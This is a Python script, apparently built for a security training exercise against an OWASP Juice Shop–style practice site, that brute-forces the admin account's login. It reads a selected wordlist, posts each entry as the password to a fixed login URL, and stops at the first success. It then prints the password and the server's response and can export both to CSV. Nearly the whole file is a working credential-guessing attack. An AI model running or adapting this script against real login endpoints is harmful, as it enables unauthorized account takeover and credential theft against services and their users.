import json
import uuid

import pandas as pd
import requests
from rich import print
from tqdm import tqdm

selected_payload = []
result_payload = []


def banner_info():
    print(f"""[red]
    
██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝ [/red]
                                                                                    v1.0   

    """)


def brute_force():
    print("[bold cyan]---------| Brute Force Attack |---------[/bold cyan]")
    banner_info()
    url = "https://myshop.cstad.shop/rest/user/login"

    # get the wordlist
    print("[bold green]Please select a wordlist[/bold green]")
    print("[bold red][1][/bold red] [bold yellow]Default[/bold yellow]")
    print("[bold red][2][/bold red] [bold yellow]Medium[/bold yellow]")
    print("[bold red][3][/bold red] [bold yellow]High[/bold yellow]")

    wl_input = int(
        input("Please choose your wordlist option from 1 to 3: "))

    wordlist_files = {
        1: "wordlist/wordlist",
        2: "wordlist/medium_wordlist",
        3: "wordlist/high_wordlist"
    }

    if wl_input in wordlist_files:
        try:
            with open(wordlist_files[wl_input], "r") as wordlist_file:
                for line in wordlist_file:
                    selected_payload.append(line.strip())

        except FileNotFoundError:
            print("[bold red]File not found![/bold red]")
    else:
        print("[bold red]Invalid wordlist option![/bold red]")

    with tqdm(total=len(selected_payload), desc="Testing Payloads", unit="payload") as pbar:
        for payload in selected_payload:
            params = {'email': 'admin@juice-sh.op', 'password': payload}
            try:
                response = requests.post(url, json=params)
            except requests.exceptions.RequestException as e:
                print(e.response)
            else:
                if response.status_code == 200:
                    print("[bold green]Found the password![/bold green] : " + payload)
                    result_payload.append({payload: response.json()})

            pbar.update(1)
            if len(result_payload) > 0:
                break
    summary_result(result_payload)


def handle_export_res_to_csv(res):

    payload_data = []
    response_data = []

    for item in res:
        for key, value in item.items():
            payload_data.append(key)
            response_data.append(value)

    data = {
        "Payload": payload_data,
        "Response": response_data
    }

    df = pd.DataFrame(data)

    # Generate a unique filename using UUID
    file_id = uuid.uuid1()
    filename = f"result_{file_id}.csv"

    # Export DataFrame to CSV with the unique filename
    df.to_csv(filename, index=False)

    print(f"[bold green]Data exported to {filename} successfully.[/bold green]")


def summary_result(res):
    print("[bold cyan]---------| Finished the scanning attack |---------[/bold cyan]")
    print("[bold yellow]Result:[/bold yellow]")
    print(json.dumps(res, indent=4))

    print("[bold yellow]Do you want to export the result to csv file?[/bold yellow]")
    print("[bold red][1][/bold red] [bold yellow]Yes[/bold yellow]")
    print("[bold red][2][/bold red] [bold yellow]No[/bold yellow]")
    export_option = int(input("Please choose your option from 1 to 2: "))
    if export_option == 1:
        handle_export_res_to_csv(res)
    elif export_option == 2:
        print("[bold yellow]Thank you for using our tool![/bold yellow]")
    else:
        print("[bold red]Invalid option![/bold red]")


brute_force()
